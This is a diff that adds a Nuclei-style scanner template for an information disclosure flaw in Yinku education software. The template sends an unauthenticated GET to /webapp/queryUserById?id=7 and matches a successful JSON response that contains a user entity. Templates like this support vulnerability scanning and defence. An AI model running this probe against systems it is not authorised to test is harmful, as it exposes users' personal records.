@@ -1,0 +1,25 @@
+id: yinkujiaoyu-queryUserById-Information-disclosure
+
+info:
+  name: 因酷教育软件 queryUserById 信息泄露漏洞
+  author: yinkujiaoyu
+  severity: medium
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        GET /webapp/queryUserById?id=7 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"message":'
+          - '"entity":{'
+        condition: and
+      - type: status
+        status: 
+          - 200
